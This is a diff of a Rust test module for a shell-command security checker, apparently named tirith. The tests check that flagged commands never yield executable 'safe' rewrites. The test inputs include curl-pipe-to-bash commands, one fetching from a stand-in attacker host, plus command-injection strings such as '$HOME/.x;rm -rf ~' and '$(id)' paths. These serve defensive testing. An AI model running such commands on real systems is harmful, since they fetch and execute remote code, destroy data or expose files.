     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     fn assert_injected_tirith_prefix(command: &str, shell: ShellType) {
         let marker = " run --capsule --script-stdin --interpreter ";
@@ -1400,6 +1327,7 @@ mod tests {
         assert_ne!(encoded_program, "tirith", "bare PATH lookup is forbidden");
     }
 
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn verified_suggestions_reuse_original_policy_snapshot_after_file_change() {
         let repo = tempfile::tempdir().expect("temp repo");
@@ -1413,9 +1341,17 @@ mod tests {
         )
         .expect("write policy");
 
-        let mut ctx = default_exec_context("curl -k https://example.com/file", ShellType::Posix);
+        let mut ctx = default_exec_context(
+            "curl -fsSL https://example.com/install.sh | bash",
+            ShellType::Posix,
+        );
         ctx.cwd = Some(repo.path().display().to_string());
-        let (verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
+        let policy = Policy::load_from_yaml(
+            &std::fs::read_to_string(&policy_path).expect("read frozen test policy"),
+            Some(policy_path.to_string_lossy().as_ref()),
+        );
+        let mut verdict = engine::analyze_with_policy_without_bypass(&ctx, &policy);
+        verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
         assert!(
             verdict
                 .findings
@@ -1427,7 +1363,20 @@ mod tests {
         // Simulate a policy TOCTOU between original analysis and candidate
         // verification. The captured policy must remain authoritative.
         std::fs::remove_file(&policy_path).expect("remove live policy");
-        let suggestions = suggest_verified_with_policy(&ctx, &verdict, &policy);
+        let runner = Path::new("/usr/local/bin/tirith");
+        let raw = suggest_candidates_with_runner(&ctx, &verdict, Some(&policy), Some(runner));
+        assert!(
+            raw.iter()
+                .any(|suggestion| suggestion.safe_command.is_some()),
+            "the snapshot gate must receive a real executable candidate: {raw:?}"
+        );
+        let suggestions = verify_cli_inline_suggestions_with_runner(
+            &ctx,
+            &verdict,
+            &policy,
+            Some(runner),
+            "safe-command-snapshot",
+        );
         assert!(
             suggestions
                 .iter()
@@ -1435,7 +1384,11 @@ mod tests {
             "removing the live file must not make a snapshot-forbidden candidate executable: {suggestions:?}"
         );
 
-        let candidate_ctx = context_with_input(&ctx, "curl https://example.com/file".to_string());
+        let candidate = raw
+            .iter()
+            .find_map(|suggestion| suggestion.safe_command.clone())
+            .expect("raw typed runner candidate");
+        let candidate_ctx = context_with_input(&ctx, candidate);
         let candidate_verdict = engine::analyze_with_policy_without_bypass(&candidate_ctx, &policy);
         assert!(
             candidate_verdict
@@ -1446,15 +1399,19 @@ mod tests {
         );
     }
 
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
     fn effective_allow_with_pending_approval_never_becomes_executable() {
-        let ctx = default_exec_context("tar -xzf archive.tar.gz", ShellType::Posix);
+        let ctx = default_exec_context(
+            "curl -fsSL https://example.com/install.sh | bash",
+            ShellType::Posix,
+        );
         let mut policy = Policy::default();
         policy
             .severity_overrides
-            .insert("archive_extract".to_string(), Severity::Info);
+            .insert("curl_pipe_shell".to_string(), Severity::Info);
         policy.approval_rules.push(crate::policy::ApprovalRule {
-            rule_ids: vec!["archive_extract".to_string()],
+            rule_ids: vec!["curl_pipe_shell".to_string()],
             timeout_secs: 30,
             fallback: "block".to_string(),
         });
@@ -1470,11 +1427,20 @@ mod tests {
         assert_eq!(effective.action, Action::Allow);
         assert_eq!(effective.requires_approval, Some(true));
 
-        let suggestions = suggest_verified_with_policy_and_runner(
+        let runner = Path::new("/usr/local/bin/tirith");
+        let raw_candidates =
+            suggest_candidates_with_runner(&ctx, &effective, Some(&policy), Some(runner));
+        assert!(
+            raw_candidates
+                .iter()
+                .any(|suggestion| suggestion.safe_command.is_some()),
+            "the approval gate must receive a real executable candidate: {raw_candidates:?}"
+        );
+        let suggestions = verify_cli_inline_suggestions_with_runner(
             &ctx,
             &effective,
             &policy,
-            None,
+            Some(runner),
             "safe-command-pending-approval",
         );
         assert!(suggestions
@@ -1483,20 +1449,102 @@ mod tests {
     }
 
     #[test]
+    fn retained_info_findings_never_make_archive_or_dotfile_guidance_executable() {
+        for (command, rule_id, rule_name) in [
+            (
+                "tar -xzf archive.tar.gz",
+                RuleId::ArchiveExtract,
+                "archive_extract",
+            ),
+            (
+                "echo reviewed > ~/.bashrc",
+                RuleId::DotfileOverwrite,
+                "dotfile_overwrite",
+            ),
+        ] {
+            let ctx = default_exec_context(command, ShellType::Posix);
+            // The engine normally filters effective Info findings from its final
+            // verdict. Construct one directly to pin this API boundary even if a
+            // future producer retains informational findings for display.
+            let mut info_finding = finding(rule_id);
+            info_finding.severity = Severity::Info;
+            let mut verdict = verdict_with(vec![info_finding]);
+            verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
+            assert_eq!(verdict.action, Action::Allow, "{verdict:?}");
+            assert_eq!(verdict.findings.len(), 1, "{verdict:?}");
+
+            let policy = Policy::default();
+            let suggestions = verify_cli_inline_suggestions_with_runner(
+                &ctx,
+                &verdict,
+                &policy,
+                Some(Path::new("/usr/local/bin/tirith")),
+                "safe-command-info-override",
+            );
+            let suggestion = suggestions
+                .iter()
+                .find(|suggestion| suggestion.rule_id == rule_name)
+                .unwrap_or_else(|| panic!("missing guidance for {rule_name}: {suggestions:?}"));
+            assert!(
+                suggestion.safe_command.is_none(),
+                "an Info finding must not turn {rule_name} into executable output: {suggestion:?}"
+            );
+        }
+    }
+
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    #[test]
     fn agent_rule_denial_blocks_raw_allow_candidate() {
-        let ctx = default_exec_context("tar -xzf archive.tar.gz", ShellType::Posix);
+        let ctx = default_exec_context(
+            "curl -fsSL https://example.com/install.sh | bash",
+            ShellType::Posix,
+        );
         let mut policy = Policy::default();
         policy.agent_rules.deny.push(crate::policy::AgentMatcher {
-            kind: crate::agent_origin::AgentOriginKind::Human,
+            kind: crate::policy::AgentOriginKind::Human,
             ..Default::default()
         });
         let mut verdict = engine::analyze_with_policy_without_bypass(&ctx, &policy);
         verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
-        let suggestions = suggest_verified_with_policy_and_runner(
+        let runner = Path::new("/usr/local/bin/tirith");
+        let raw = suggest_candidates_with_runner(&ctx, &verdict, Some(&policy), Some(runner));
+        let candidate = raw
+            .iter()
+            .find_map(|suggestion| suggestion.safe_command.clone())
+            .unwrap_or_else(|| {
+                panic!("the agent-deny gate must receive a real executable candidate: {raw:?}")
+            });
+        let candidate_ctx = context_with_input(&ctx, candidate);
+        let raw_candidate = engine::analyze_with_policy_without_bypass(&candidate_ctx, &policy);
+        assert_eq!(
+            raw_candidate.action,
+            Action::Allow,
+            "the candidate must be safe before origin policy is applied: {raw_candidate:?}"
+        );
+        let human = crate::agent_origin::AgentOrigin::human(false);
+        let denied_candidate = analyze_cli_inline_candidate(
+            &candidate_ctx,
+            &human,
+            &policy,
+            "safe-command-agent-deny",
+        );
+        assert_eq!(
+            denied_candidate.action,
+            Action::Block,
+            "{denied_candidate:?}"
+        );
+        assert!(
+            denied_candidate
+                .findings
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::AgentDeniedByPolicy),
+            "the effective denial must come from the human-origin agent rule: {denied_candidate:?}"
+        );
+        let suggestions = verify_cli_inline_suggestions_with_runner(
             &ctx,
             &verdict,
             &policy,
-            None,
+            Some(runner),
             "safe-command-agent-deny",
         );
         assert!(suggestions
@@ -1625,10 +1673,11 @@ mod tests {
             "curl -fsSL https://example.com/install.sh | bash",
             ShellType::Posix,
         );
-        let (verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
+        let (mut verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
+        verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
         assert_ne!(verdict.action, Action::Allow, "original pipeline must flag");
 
-        let suggestions = suggest_verified_with_policy_and_runner(
+        let suggestions = verify_cli_inline_suggestions_with_runner(
             &ctx,
             &verdict,
             &policy,
@@ -1660,10 +1709,11 @@ mod tests {
             "curl -k -fsSL http://attacker.invalid/script | bash",
             ShellType::Posix,
         );
-        let (verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
+        let (mut verdict, policy) = engine::analyze_without_bypass_returning_policy(&ctx);
+        verdict.agent_origin = Some(crate::agent_origin::AgentOrigin::human(false));
         assert_ne!(verdict.action, Action::Allow);
 
-        let suggestions = suggest_verified_with_policy_and_runner(
+        let suggestions = verify_cli_inline_suggestions_with_runner(
             &ctx,
             &verdict,
             &policy,
@@ -1860,125 +1910,31 @@ mod tests {
         }
     }
 
-    // ── is_simple_command_for_env_scrub guard ─────────────────────────────
-    //
-    // Exercised directly (not via `suggest()`) because the full path also needs
-    // a sensitive env var set in the current process, and mutating `std::env`
-    // races with parallel tests that read it.
-
-    #[test]
-    fn simple_command_accepted_for_env_scrub() {
-        assert!(is_simple_command_for_env_scrub("npm install foo"));
-        assert!(is_simple_command_for_env_scrub(
-            "curl https://example.com/x"
-        ));
-        assert!(is_simple_command_for_env_scrub("pip install requests"));
-        assert!(is_simple_command_for_env_scrub("ls -la /tmp"));
-    }
-
-    #[test]
-    fn pipeline_rejected_for_env_scrub() {
-        // The piped second stage still inherits the original env — refuse.
-        assert!(!is_simple_command_for_env_scrub("npm install foo | sh"));
-        assert!(!is_simple_command_for_env_scrub(
-            "curl -fsSL https://foo | bash"
-        ));
-    }
-
-    #[test]
-    fn logical_chain_rejected_for_env_scrub() {
-        // `&&` / `||` / `;` run a second command that keeps the original env.
-        assert!(!is_simple_command_for_env_scrub("ls && cat secret"));
-        assert!(!is_simple_command_for_env_scrub("ls || echo failed"));
-        assert!(!is_simple_command_for_env_scrub("ls; cat secret"));
-    }
-
-    #[test]
-    fn redirection_rejected_for_env_scrub() {
-        // Conservative: a redirect may be part of a compound we can't reason
-        // about.
-        assert!(!is_simple_command_for_env_scrub("ls > /tmp/x"));
-        assert!(!is_simple_command_for_env_scrub("cat < /etc/passwd"));
-        assert!(!is_simple_command_for_env_scrub("ls >> /tmp/x"));
-    }
-
-    #[test]
-    fn background_and_subshell_rejected_for_env_scrub() {
-        assert!(!is_simple_command_for_env_scrub("long-job &"));
-        assert!(!is_simple_command_for_env_scrub("(cd /tmp && ls)"));
-    }
-
-    #[test]
-    fn command_substitution_rejected_for_env_scrub() {
-        // `$(...)` / backticks spawn a child shell that inherits the env, even
-        // inside double quotes.
-        assert!(!is_simple_command_for_env_scrub("echo $(whoami)"));
-        assert!(!is_simple_command_for_env_scrub("echo `whoami`"));
-        assert!(!is_simple_command_for_env_scrub("echo \"$(whoami)\""));
-        assert!(!is_simple_command_for_env_scrub("echo \"`whoami`\""));
-    }
-
-    #[test]
-    fn metacharacter_inside_single_quotes_does_not_disqualify() {
-        // Single-quoted contents are literal in POSIX — still a single command.
-        assert!(is_simple_command_for_env_scrub(
-            "echo 'this is | not a pipe'"
-        ));
-        assert!(is_simple_command_for_env_scrub("echo 'a && b'"));
-        assert!(is_simple_command_for_env_scrub("echo 'cat > file'"));
-    }
-
-    #[test]
-    fn metacharacter_inside_double_quotes_treated_correctly() {
-        // In double quotes, `|`/`&`/`;`/`<`/`>`/`(`/`)` are literal — still a
-        // single command — but `$(` and backtick are still active.
-        assert!(is_simple_command_for_env_scrub(
-            "echo \"this is | not a pipe\""
-        ));
-        assert!(is_simple_command_for_env_scrub("echo \"a && b\""));
-        assert!(!is_simple_command_for_env_scrub("echo \"$(whoami)\""));
-    }
-
-    #[test]
-    fn escaped_metacharacter_does_not_disqualify() {
-        // A backslash-escaped metacharacter is a literal, not a pipeline.
-        assert!(is_simple_command_for_env_scrub("grep \\| file"));
-        assert!(is_simple_command_for_env_scrub("echo a\\&b"));
-    }
-
-    #[test]
-    fn unterminated_quote_is_rejected() {
-        // Malformed input — decline (guessing the wrapper is most dangerous here).
-        assert!(!is_simple_command_for_env_scrub("echo 'unterminated"));
-        assert!(!is_simple_command_for_env_scrub("echo \"unterminated"));
-        assert!(!is_simple_command_for_env_scrub("echo trailing\\"));
-    }
-
     #[test]
     fn dedicated_rule_present_is_an_env_scrub_trigger() {
         // M9 ch4 — the dedicated `EnvSensitiveExposedToUnknownScript` finding
         // (Medium, so the `any_high` heuristic is false) is recognized as an
-        // env-scrub trigger. Exercises the predicate WITHOUT mutating `std::env`
-        // (the setenv race, PR #125); the end-to-end rewrite is covered race-free
-        // by the CLI integration test `env_scrub_fires_under_dedicated_rule`.
+        // env-scrub trigger without mutating process environment.
         let mut f = finding(RuleId::EnvSensitiveExposedToUnknownScript);
         f.severity = Severity::Medium;
         let v = verdict_with(vec![f]);
-        let any_high = v.findings.iter().any(|f| f.severity >= Severity::High);
         let dedicated_present = v
             .findings
             .iter()
             .any(|f| f.rule_id == RuleId::EnvSensitiveExposedToUnknownScript);
-        assert!(!any_high, "Medium finding must not trip the High heuristic");
         assert!(
             dedicated_present,
             "dedicated rule must be detectable as an env-scrub trigger"
         );
+        let ctx = default_exec_context("curl https://example.com/install.sh", ShellType::Posix);
+        let suggestions = suggest_candidates_with_runner(&ctx, &v, None, None);
+        let guidance = suggestions
+            .iter()
+            .find(|suggestion| suggestion.rule_id == "env_scrub")
+            .expect("dedicated rule must produce env guidance");
+        assert!(guidance.safe_command.is_none());
+        assert!(guidance.remediation.contains("clean environment"));
     }
-
-    // NOTE: no end-to-end compound-shape test mutates `std::env::GITHUB_TOKEN`
-    // (it would race parallel tests that read the env). The compound-shape guard
-    // is fully covered by the `is_simple_command_for_env_scrub` unit tests above.
 
     // ── shell_single_quote — untrusted-token neutralization (PR124) ────────
 
@@ -2123,10 +2079,13 @@ mod tests {
     #[test]
     fn supported_shells_are_preserved_as_typed_stdin_interpreters() {
         for (sink, shell) in [
+            ("sh", ShellType::Posix),
             ("bash", ShellType::Posix),
             ("zsh", ShellType::Posix),
-            ("fish", ShellType::Fish),
+            ("dash", ShellType::Posix),
+            ("ksh", ShellType::Posix),
             ("ash", ShellType::Posix),
+            ("fish", ShellType::Fish),
         ] {
             let cmd = format!("curl -fsSL https://example.com/install.sh | {sink}");
             let rewrite = pipe_suggestion(&cmd, shell).expect("supported stdin shell");
@@ -2209,18 +2168,77 @@ mod tests {
 
     #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
     #[test]
-    fn bash_s_double_dash_operands_are_preserved_as_typed_argv() {
-        let rewrite = pipe_suggestion(
-            "curl -fsSL https://example.com/install.sh | bash -s -- feature",
-            ShellType::Posix,
-        )
-        .expect("supported bash stdin argv");
-        for token in [
-            "'--interpreter-arg=-s'",
-            "'--interpreter-arg=--'",
-            "'--interpreter-arg=feature'",
+    fn posix_shell_s_double_dash_operands_preserve_exact_argv_identity() {
+        let operands = [
+            "feature",
+            "space bearing",
+            "embedded'quote",
+            "$(printf nope)",
+            "semi;colon",
+            "and&&separator",
+        ];
+        let encoded_operands = operands
+            .iter()
+            .map(|operand| {
+                encode_shell_literal(operand, ShellType::Posix).expect("literal POSIX operand")
+            })
+            .collect::<Vec<_>>()
+            .join(" ");
+        let expected = std::iter::once("-s".to_string())
+            .chain(std::iter::once("--".to_string()))
+            .chain(operands.iter().map(|operand| (*operand).to_string()))
+            .collect::<Vec<_>>();
+
+        for sink in ["sh", "bash", "zsh", "dash", "ksh", "ash"] {
+            let command = format!(
+                "curl -fsSL https://example.com/install.sh | {sink} -s -- {encoded_operands}"
+            );
+            let rewrite = pipe_suggestion(&command, ShellType::Posix)
+                .unwrap_or_else(|| panic!("supported {sink} stdin argv"));
+            let segments = tokenize::tokenize(&rewrite, ShellType::Posix);
+            assert_eq!(segments.len(), 1, "{sink}: {rewrite}");
+            let decoded = decode_literal_words(&segments[0].args, ShellType::Posix)
+                .unwrap_or_else(|| panic!("decode generated {sink} argv: {rewrite}"));
+            let actual = decoded
+                .iter()
+                .filter_map(|arg| arg.strip_prefix("--interpreter-arg=").map(str::to_string))
+                .collect::<Vec<_>>();
+            assert_eq!(actual, expected, "{sink}: {rewrite}");
+        }
+    }
+
+    #[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+    #[test]
+    fn unproven_fetcher_body_streams_remain_guidance_only() {
+        for (command, rule_id) in [
+            (
+                "http https://example.com/install.sh | bash",
+                RuleId::HttpiePipeShell,
+            ),
+            (
+                "https https://example.com/install.sh | bash",
+                RuleId::HttpiePipeShell,
+            ),
+            (
+                "xh https://example.com/install.sh | bash",
+                RuleId::XhPipeShell,
+            ),
+            (
+                "fetch https://example.com/install.sh | bash",
+                RuleId::PipeToInterpreter,
+            ),
         ] {
-            assert!(rewrite.contains(token), "missing {token}: {rewrite}");
+            let suggestions = suggest(
+                command,
+                ShellType::Posix,
+                &verdict_with(vec![finding(rule_id)]),
+            );
+            assert!(
+                suggestions
+                    .iter()
+                    .all(|suggestion| suggestion.safe_command.is_none()),
+                "unproven fetcher emitted executable output for {command}: {suggestions:?}"
+            );
         }
     }
 
@@ -2271,68 +2289,21 @@ mod tests {
         assert!(decode_powershell_literal("\u{201c}https://example.com/\u{201d}").is_none());
     }
 
-    // ── rewrite_archive_list_first — archive path is single-quoted (PR124) ──
+    // ── archive findings remain guidance-only ──────────────────────────────
 
     #[test]
-    fn archive_list_first_quotes_command_substitution_path() {
-        // A hostile archive path with `$(id)`. Only the preview half is quoted;
-        // the `&&` tail re-emits the user's raw command verbatim.
+    fn archive_command_substitution_path_is_guidance_only() {
         let cmd = "tar -xzf '$(id).tar.gz'";
         let v = verdict_with(vec![finding(RuleId::ArchiveExtract)]);
         let s = suggest(cmd, ShellType::Posix, &v);
-        let sc = s[0].safe_command.as_deref().unwrap();
-        assert!(
-            sc.starts_with("tar -tf '$(id).tar.gz' | head"),
-            "archive path on the preview half must be single-quoted: {sc}"
-        );
-        // The preview half (before ` && `) must not contain a bare $(id).
-        let preview = sc.split(" && ").next().unwrap();
-        assert!(
-            !preview.replace("'$(id).tar.gz'", "").contains("$(id)"),
-            "no bare $(id) on the preview half: {sc}"
-        );
+        assert!(s[0].safe_command.is_none());
     }
 
     #[test]
-    fn archive_list_first_does_not_requote_raw_tail() {
-        // The `&&` tail is the user's ORIGINAL command, re-emitted verbatim —
-        // it must NOT be wrapped in quotes (that would corrupt it).
+    fn archive_original_extract_is_never_reemitted_as_a_fix() {
         let cmd = "tar -xzf foo.tar.gz -C ~/";
         let v = verdict_with(vec![finding(RuleId::ArchiveExtract)]);
         let s = suggest(cmd, ShellType::Posix, &v);
-        let sc = s[0].safe_command.as_deref().unwrap();
-        assert!(
-            sc.ends_with(" && tar -xzf foo.tar.gz -C ~/"),
-            "raw tail must be re-emitted verbatim, unquoted: {sc}"
-        );
-    }
-
-    // ── dotfile_redirect_token_is_safe — refuse-not-quote (PR124) ──────────
-
-    #[test]
-    fn dotfile_token_accepts_plain_paths() {
-        // Legitimate `~`/`$HOME` dotfile paths stay accepted (so the rewrite can
-        // keep them UNQUOTED for shell expansion).
-        assert!(dotfile_redirect_token_is_safe("~/.bashrc"));
-        assert!(dotfile_redirect_token_is_safe(
-            "$HOME/.config/foo/config.toml"
-        ));
-        assert!(dotfile_redirect_token_is_safe("~/.ssh/authorized_keys"));
-    }
-
-    #[test]
-    fn dotfile_token_refuses_injection_payloads() {
-        // Metacharacters after the prefix are an injection/glob attempt — refuse.
-        assert!(!dotfile_redirect_token_is_safe("~/.bashrc$(id)"));
-        assert!(!dotfile_redirect_token_is_safe("~/.b`id`"));
-        assert!(!dotfile_redirect_token_is_safe("$HOME/.x;rm -rf ~"));
-        assert!(!dotfile_redirect_token_is_safe("~/.x|sh"));
-        assert!(!dotfile_redirect_token_is_safe("~/.x*"));
-        assert!(!dotfile_redirect_token_is_safe("~/.x y"));
-        // A second `$` (beyond the legitimate `$HOME` prefix) is refused.
-        assert!(!dotfile_redirect_token_is_safe("$HOME/.x$EVIL"));
-        // Wrong / missing prefix → refuse (defensive; extractor only emits these two).
-        assert!(!dotfile_redirect_token_is_safe("/etc/passwd"));
-        assert!(!dotfile_redirect_token_is_safe("~/"));
+        assert!(s[0].safe_command.is_none());
     }
 }
